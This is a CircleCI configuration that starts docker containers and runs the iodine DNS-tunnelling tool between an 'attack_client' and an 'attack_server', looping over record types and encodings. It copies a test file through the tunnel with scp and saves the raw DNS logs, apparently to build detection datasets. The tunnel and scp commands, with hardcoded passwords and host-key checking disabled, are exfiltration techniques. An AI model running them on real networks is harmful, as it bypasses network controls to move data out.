version: 2.1
jobs:
  build:
    machine:
      image: ubuntu-2004:202010-01

    parameters:
      dnstype:
        type: string
      encoding:
        type: string

    environment:
      LOG_DIR: /tmp/logs

    steps:
      - checkout

      - run: mkdir -p $LOG_DIR

      - run:
          name: Start container and verify it's working
          command: |
            set -x
            docker-compose up -d
            docker-compose ps
            docker run -d dns_server_1 /usr/sbin/named -f
            docker exec -d attack_server_1 /usr/sbin/sshd -D
            docker exec -d attack_client_1 iodine -4 -f -P abc123 -T<< parameters.dnstype >> -O<< parameters.encoding >> -r 172.18.0.4 example.attack
            #docker exec -d attack_client_1 iodine -4 -f -P abc123 -Tsrv -Oraw -r 172.18.0.4 example.attack
            docker exec -it attack_client_1 sshpass -p 'root' scp -r -oStrictHostKeyChecking=no root@10.0.0.1:test-file /tmp/
            sudo chmod -R +rw $LOG_DIR/*.log

      - store_artifacts:
          path: /tmp/logs
          destination: raw-dns-logs-<< parameters.dnstype >>-<< parameters.encoding >>
          #destination: dns-logs-{{ var 1 }}

workflows:
  all-iodine-combinations:
    jobs:
      - build:
          matrix:
            parameters:
              dnstype: ['null'] #, srv, cname, txt, private, mx, a]
              encoding: [raw] #, base32, base64, base128]
